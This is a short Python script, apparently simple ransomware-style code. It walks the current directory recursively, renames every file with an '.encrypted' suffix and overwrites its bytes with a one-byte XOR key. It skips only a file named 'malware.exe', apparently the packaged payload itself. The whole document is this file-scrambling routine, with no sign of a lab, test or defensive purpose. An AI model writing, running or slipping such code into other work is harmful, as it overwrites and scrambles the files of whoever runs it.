import os

def xor_hex(content, key):
    # Convert the content to a byte array
    byte_array = bytearray(content)
    # Perform XOR on each byte
    xor_result = bytearray([b ^ key for b in byte_array])
    return xor_result

def process_file(file_path, key):
    try:
        with open(file_path, 'rb') as file:
            content = file.read()
        
        xor_result = xor_hex(content, key)
        
        with open(file_path, 'wb') as file:
            file.write(xor_result)
        
        print(f"Processed and saved file: {file_path}")
    except Exception as e:
        print(f"Failed to process {file_path}: {e}")

def rename_file(file_path):
    if file_path.endswith(".encrypted"):
        new_file_path = file_path[:-10]  
    else:
        new_file_path = file_path + ".encrypted"  

    try:
        os.rename(file_path, new_file_path)
        print(f"Renamed {file_path} to {new_file_path}")
        return new_file_path
    except Exception as e:
        print(f"Failed to rename {file_path}: {e}")
        return file_path

def process_directory(directory_path, key, exclude_file):
    try:
        for root, dirs, files in os.walk(directory_path):
            for file in files:
                if file == exclude_file:
                    continue
                file_path = os.path.join(root, file)
                new_file_path = rename_file(file_path)
                process_file(new_file_path, key)
    except Exception as e:
        print(f"Failed to process directory {directory_path}: {e}")

if __name__ == "__main__":
    current_directory = os.getcwd()
    print(f"Processing files in directory: {current_directory}")
    
    xor_key = 0x5  # XOR key
    exclude_filename = "malware.exe"  # File to exclude
    process_directory(current_directory, xor_key, exclude_filename)
